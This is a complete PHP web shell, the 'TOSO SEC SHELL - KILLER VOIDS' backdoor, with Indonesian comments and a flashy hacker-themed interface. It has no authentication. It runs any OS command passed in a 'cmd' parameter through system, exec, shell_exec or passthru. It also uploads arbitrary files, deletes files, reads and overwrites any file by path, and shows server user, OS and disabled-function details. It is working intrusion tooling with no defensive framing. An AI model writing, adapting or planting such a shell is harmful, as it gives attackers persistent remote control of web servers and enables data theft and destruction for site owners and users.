<?php
/*
===========================================================
  TOSO SEC SHELL - KILLER VOIDS EDITION
  "Tampil keren, fitur lengkap, banner mantap!"
===========================================================
*/

// ============================================
// KONFIGURASI
// ============================================
$version = "3.0";
$release = "2024";
$author = "TOSO SEC x KILLER_VOIDS";

// ============================================
// FUNGSI EKSEKUSI COMMAND
// ============================================
function executeCommand($cmd) {
    $output = '';
    if(empty($cmd)) return '';
    
    if(function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    }
    elseif(function_exists('exec')) {
        exec($cmd, $out);
        $output = implode("\n", $out);
    }
    elseif(function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    }
    elseif(function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    }
    else {
        $output = "Command execution disabled by server.";
    }
    return $output;
}

// ============================================
// FUNGSI GET FILE LIST
// ============================================
function getFileList($dir) {
    $files = [];
    if(is_dir($dir)) {
        $scan = scandir($dir);
        foreach($scan as $file) {
            if($file != '.' && $file != '..') {
                $path = $dir . '/' . $file;
                $files[] = [
                    'name' => $file,
                    'path' => $path,
                    'type' => is_dir($path) ? 'dir' : 'file',
                    'size' => is_file($path) ? filesize($path) : 0,
                    'perm' => substr(sprintf('%o', fileperms($path)), -4),
                    'modified' => date("Y-m-d H:i:s", filemtime($path))
                ];
            }
        }
    }
    return $files;
}

// ============================================
// HANDLE ACTION
// ============================================
$current_dir = $_GET['dir'] ?? getcwd();
$cmd = $_POST['cmd'] ?? $_GET['cmd'] ?? '';
$cmd_output = '';
$upload_msg = '';

// Handle command execution
if(!empty($cmd)) {
    $cmd_output = executeCommand($cmd);
}

// Handle file upload
if(isset($_FILES['upload_file'])) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $upload_msg = "✅ File uploaded: " . basename($_FILES['upload_file']['name']);
    } else {
        $upload_msg = "❌ Upload failed!";
    }
}

// Handle file delete
if(isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if(file_exists($file) && is_file($file)) {
        unlink($file);
        $upload_msg = "✅ File deleted: " . basename($file);
    }
}

// Handle file edit
if(isset($_POST['save_file'])) {
    $file = $_POST['file_path'];
    $content = $_POST['file_content'];
    if(file_put_contents($file, $content)) {
        $upload_msg = "✅ File saved: " . basename($file);
    }
}

// Get file list
$files = getFileList($current_dir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TOSO SEC SHELL - KILLER VOIDS</title>
    <style>
        /* GLOBAL STYLE */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', 'Fira Code', monospace;
        }
        
        body {
            background: #0a0e14;
            color: #c0caf5;
            padding: 20px;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        /* MATRIX EFFECT */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg, 
                rgba(0, 255, 0, 0.03) 0px, 
                rgba(0, 0, 0, 0.8) 1px, 
                transparent 2px);
            pointer-events: none;
            z-index: 0;
            animation: matrix 20s linear infinite;
        }
        
        @keyframes matrix {
            0% { background-position: 0 0; }
            100% { background-position: 0 20px; }
        }
        
        .container {
            position: relative;
            z-index: 10;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* TOSO SEC BANNER */
        .banner {
            background: #0f1a1a;
            border: 3px solid #ff5555;
            padding: 30px;
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
            animation: glowPulse 3s infinite;
        }
        
        @keyframes glowPulse {
            0%, 100% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.3); }
            50% { box-shadow: 0 0 80px rgba(255, 0, 0, 0.6); }
        }
        
        .banner::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                45deg,
                transparent 30%,
                rgba(255, 0, 0, 0.1) 50%,
                transparent 70%
            );
            animation: scan 8s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }
        
        .glitch {
            font-size: 4rem;
            font-weight: 900;
            text-transform: uppercase;
            color: #fff;
            text-shadow: 
                0.05em 0 0 #ff00c1,
                -0.05em -0.025em 0 #00fff9,
                0.025em 0.05em 0 #ff0000;
            animation: glitch 725ms infinite;
            text-align: center;
            letter-spacing: 10px;
        }
        
        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-3px, 3px); }
            40% { transform: translate(-3px, -3px); }
            60% { transform: translate(3px, 3px); }
            80% { transform: translate(3px, -3px); }
        }
        
        .sub-banner {
            text-align: center;
            margin-top: 15px;
            font-size: 1.2rem;
            color: #7fffd4;
            border-top: 1px dashed #ff5555;
            border-bottom: 1px dashed #ff5555;
            padding: 10px;
        }
        
        .sub-banner span {
            color: #ff5555;
            font-weight: bold;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.5; }
        }
        
        /* INFO BAR */
        .info-bar {
            background: #1a1b26;
            border: 2px solid #3b4261;
            padding: 15px;
            margin-bottom: 20px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 10px;
            border-left: 5px solid #f7768e;
        }
        
        .info-item {
            color: #9ece6a;
            font-size: 0.9rem;
        }
        
        .info-item strong {
            color: #ff9e64;
        }
        
        /* MESSAGE */
        .message {
            background: #283457;
            border-left: 5px solid #9d7cd8;
            padding: 15px;
            margin-bottom: 20px;
            color: #c0caf5;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateX(-20px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        /* NAVIGATION */
        .nav-bar {
            background: #1a1b26;
            border: 2px solid #3b4261;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
        }
        
        .path {
            flex: 3;
            background: #24283b;
            border: 1px solid #414868;
            padding: 10px 15px;
            color: #7dcfff;
            font-family: monospace;
            font-size: 0.9rem;
            word-break: break-all;
        }
        
        .btn {
            background: #2f354a;
            border: 1px solid #414868;
            color: #c0caf5;
            padding: 10px 20px;
            cursor: pointer;
            text-decoration: none;
            font-size: 0.9rem;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            border-radius: 4px;
        }
        
        .btn:hover {
            background: #3b4261;
            border-color: #7aa2f7;
            color: #7aa2f7;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(122, 162, 247, 0.2);
        }
        
        .btn-primary {
            background: #7aa2f7;
            border-color: #7aa2f7;
            color: #1a1b26;
        }
        
        .btn-primary:hover {
            background: #89b4fa;
            border-color: #89b4fa;
            color: #1a1b26;
        }
        
        .btn-danger {
            background: #f7768e;
            border-color: #f7768e;
            color: #1a1b26;
        }
        
        .btn-danger:hover {
            background: #ff8caa;
            border-color: #ff8caa;
        }
        
        /* FILE EXPLORER */
        .file-explorer {
            background: #1a1b26;
            border: 2px solid #3b4261;
            margin-bottom: 20px;
            overflow-x: auto;
        }
        
        .explorer-header {
            background: #24283b;
            padding: 15px;
            border-bottom: 2px solid #3b4261;
            display: grid;
            grid-template-columns: 3fr 1fr 1fr 2fr 1fr;
            gap: 10px;
            font-weight: bold;
            color: #bb9af7;
            text-transform: uppercase;
            font-size: 0.8rem;
            letter-spacing: 1px;
        }
        
        .explorer-item {
            padding: 12px 15px;
            border-bottom: 1px solid #2f354a;
            display: grid;
            grid-template-columns: 3fr 1fr 1fr 2fr 1fr;
            gap: 10px;
            align-items: center;
            transition: all 0.2s;
        }
        
        .explorer-item:hover {
            background: #24283b;
        }
        
        .file-name {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #9ece6a;
            font-weight: 500;
        }
        
        .file-name i {
            font-size: 1.2rem;
            width: 24px;
            text-align: center;
        }
        
        .dir-icon { color: #7dcfff; }
        .file-icon { color: #9ece6a; }
        .php-icon { color: #bb9af7; }
        .txt-icon { color: #c0caf5; }
        .img-icon { color: #ff9e64; }
        
        .file-size {
            color: #565f89;
            font-family: monospace;
        }
        
        .file-perm {
            color: #e0af68;
            font-family: monospace;
        }
        
        .file-date {
            color: #2ac3de;
            font-size: 0.85rem;
        }
        
        .file-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .action-btn {
            background: transparent;
            border: 1px solid #414868;
            color: #c0caf5;
            padding: 5px 10px;
            cursor: pointer;
            font-size: 0.75rem;
            text-decoration: none;
            border-radius: 3px;
            transition: all 0.2s;
        }
        
        .action-btn:hover {
            background: #3b4261;
            border-color: #7aa2f7;
        }
        
        .action-btn.edit:hover { background: #7aa2f7; color: #1a1b26; }
        .action-btn.delete:hover { background: #f7768e; color: #1a1b26; }
        .action-btn.download:hover { background: #9ece6a; color: #1a1b26; }
        
        /* COMMAND EXECUTION */
        .cmd-box {
            background: #1a1b26;
            border: 2px solid #3b4261;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .cmd-input {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .cmd-input input[type="text"] {
            flex: 1;
            background: #24283b;
            border: 1px solid #414868;
            color: #c0caf5;
            padding: 12px 15px;
            font-family: monospace;
            font-size: 1rem;
        }
        
        .cmd-input input[type="text"]:focus {
            outline: none;
            border-color: #7aa2f7;
            box-shadow: 0 0 10px rgba(122, 162, 247, 0.3);
        }
        
        .cmd-output {
            background: #0f1117;
            border: 1px solid #414868;
            padding: 15px;
            font-family: monospace;
            white-space: pre-wrap;
            color: #9ece6a;
            max-height: 300px;
            overflow-y: auto;
        }
        
        /* UPLOAD SECTION */
        .upload-box {
            background: #1a1b26;
            border: 2px solid #3b4261;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .upload-form {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .upload-form input[type="file"] {
            background: #24283b;
            border: 1px solid #414868;
            color: #c0caf5;
            padding: 10px;
            flex: 2;
        }
        
        .upload-form input[type="submit"] {
            flex: 0;
        }
        
        /* EDITOR */
        .editor-box {
            background: #1a1b26;
            border: 2px solid #3b4261;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .editor-box textarea {
            width: 100%;
            min-height: 300px;
            background: #0f1117;
            border: 1px solid #414868;
            color: #9ece6a;
            padding: 15px;
            font-family: monospace;
            margin-bottom: 15px;
        }
        
        /* FOOTER */
        .footer {
            text-align: center;
            padding: 20px;
            color: #565f89;
            border-top: 2px dashed #3b4261;
            margin-top: 30px;
        }
        
        .footer a {
            color: #bb9af7;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        /* RESPONSIVE */
        @media (max-width: 768px) {
            .glitch { font-size: 2rem; }
            .explorer-header { display: none; }
            .explorer-item {
                grid-template-columns: 1fr;
                gap: 8px;
                padding: 15px;
            }
            .file-actions { justify-content: flex-start; }
            .cmd-input { flex-direction: column; }
            .upload-form { flex-direction: column; }
            .upload-form input[type="file"] { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        
        <!-- TOSO SEC BANNER -->
        <div class="banner">
            <div class="glitch">TOSO SEC</div>
            <div class="sub-banner">
                <span>✦</span> KILLER VOIDS SHELL v<?= $version ?> <span>✦</span>
            </div>
        </div>
        
        <!-- INFO BAR -->
        <div class="info-bar">
            <div class="info-item"><strong>Server:</strong> <?= $_SERVER['SERVER_SOFTWARE'] ?? 'N/A' ?></div>
            <div class="info-item"><strong>PHP Version:</strong> <?= phpversion() ?></div>
            <div class="info-item"><strong>User:</strong> <?= get_current_user() ?></div>
            <div class="info-item"><strong>OS:</strong> <?= PHP_OS ?></div>
            <div class="info-item"><strong>Safe Mode:</strong> <?= ini_get('safe_mode') ? 'On' : 'Off' ?></div>
            <div class="info-item"><strong>Disabled Functions:</strong> <?= ini_get('disable_functions') ?: 'None' ?></div>
        </div>
        
        <!-- MESSAGE -->
        <?php if($upload_msg): ?>
        <div class="message"><?= $upload_msg ?></div>
        <?php endif; ?>
        
        <!-- NAVIGATION -->
        <div class="nav-bar">
            <div class="path">📁 <?= htmlspecialchars($current_dir) ?></div>
            <a href="?dir=<?= urlencode(dirname($current_dir)) ?>" class="btn">⬆️ Up</a>
            <a href="?dir=<?= urlencode(getcwd()) ?>" class="btn">🏠 Home</a>
            <a href="?dir=<?= urlencode($current_dir) ?>&refresh=1" class="btn">🔄 Refresh</a>
        </div>
        
        <!-- FILE EXPLORER -->
        <div class="file-explorer">
            <div class="explorer-header">
                <div>Name</div>
                <div>Size</div>
                <div>Perm</div>
                <div>Modified</div>
                <div>Actions</div>
            </div>
            
            <?php foreach($files as $file): ?>
            <div class="explorer-item">
                <div class="file-name">
                    <?php if($file['type'] == 'dir'): ?>
                        <i class="dir-icon">📁</i>
                        <a href="?dir=<?= urlencode($file['path']) ?>" style="color: #7dcfff; text-decoration: none;"><?= htmlspecialchars($file['name']) ?></a>
                    <?php else: ?>
                        <?php
                        $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
                        $icon = '📄';
                        $iconClass = 'file-icon';
                        
                        if(in_array($ext, ['php', 'php5', 'phtml'])) {
                            $icon = '🐘';
                            $iconClass = 'php-icon';
                        } elseif(in_array($ext, ['txt', 'log', 'md'])) {
                            $icon = '📝';
                            $iconClass = 'txt-icon';
                        } elseif(in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])) {
                            $icon = '🖼️';
                            $iconClass = 'img-icon';
                        } elseif(in_array($ext, ['zip', 'tar', 'gz', 'rar'])) {
                            $icon = '📦';
                        } elseif(in_array($ext, ['html', 'htm', 'css', 'js'])) {
                            $icon = '🌐';
                        }
                        ?>
                        <i class="<?= $iconClass ?>"><?= $icon ?></i>
                        <span><?= htmlspecialchars($file['name']) ?></span>
                    <?php endif; ?>
                </div>
                
                <div class="file-size">
                    <?php if($file['type'] == 'file'): ?>
                        <?= round($file['size'] / 1024, 2) ?> KB
                    <?php else: ?>
                        &lt;DIR&gt;
                    <?php endif; ?>
                </div>
                
                <div class="file-perm"><?= $file['perm'] ?></div>
                
                <div class="file-date"><?= $file['modified'] ?></div>
                
                <div class="file-actions">
                    <?php if($file['type'] == 'file'): ?>
                        <a href="?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($file['path']) ?>" class="action-btn edit">✏️ Edit</a>
                        <a href="?dir=<?= urlencode($current_dir) ?>&delete=<?= urlencode($file['path']) ?>" class="action-btn delete" onclick="return confirm('Delete <?= htmlspecialchars($file['name']) ?>?')">🗑️ Del</a>
                        <a href="<?= $file['path'] ?>" class="action-btn download" target="_blank">⬇️ DL</a>
                    <?php else: ?>
                        <a href="?dir=<?= urlencode($file['path']) ?>" class="action-btn">📂 Open</a>
                    <?php endif; ?>
                </div>
            </div>
            <?php endforeach; ?>
        </div>
        
        <!-- COMMAND EXECUTION -->
        <div class="cmd-box">
            <h2 style="color: #bb9af7; margin-bottom: 15px;">⌨️ Command Execution</h2>
            <form method="POST">
                <div class="cmd-input">
                    <input type="text" name="cmd" placeholder="Contoh: whoami, ls -la, id, pwd" value="<?= htmlspecialchars($cmd) ?>">
                    <input type="submit" value="Execute" class="btn btn-primary">
                </div>
            </form>
            
            <?php if(!empty($cmd_output)): ?>
            <div class="cmd-output">
                <pre><?= htmlspecialchars($cmd_output) ?></pre>
            </div>
            <?php endif; ?>
        </div>
        
        <!-- FILE UPLOAD -->
        <div class="upload-box">
            <h2 style="color: #bb9af7; margin-bottom: 15px;">📤 File Upload</h2>
            <form method="POST" enctype="multipart/form-data" class="upload-form">
                <input type="file" name="upload_file" required>
                <input type="submit" value="Upload" class="btn btn-primary">
            </form>
        </div>
        
        <!-- FILE EDITOR -->
        <?php if(isset($_GET['edit'])): 
            $edit_file = $_GET['edit'];
            $file_content = file_exists($edit_file) ? file_get_contents($edit_file) : '';
        ?>
        <div class="editor-box">
            <h2 style="color: #bb9af7; margin-bottom: 15px;">✏️ Editing: <?= basename($edit_file) ?></h2>
            <form method="POST">
                <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="file_content" placeholder="File content..."><?= htmlspecialchars($file_content) ?></textarea>
                <div style="display: flex; gap: 10px;">
                    <input type="submit" name="save_file" value="Save File" class="btn btn-primary">
                    <a href="?dir=<?= urlencode($current_dir) ?>" class="btn">Cancel</a>
                </div>
            </form>
        </div>
        <?php endif; ?>
        
        <!-- FOOTER -->
        <div class="footer">
            <p>🔥 <strong>TOSO SEC SHELL</strong> 🔥</p>
            <p>Version <?= $version ?> | Release <?= $release ?> | By <?= $author ?></p>
            <p><a href="#">KILLER VOIDS</a> | <a href="#">TOSO SEC</a></p>
        </div>
    </div>
</body>
</html>
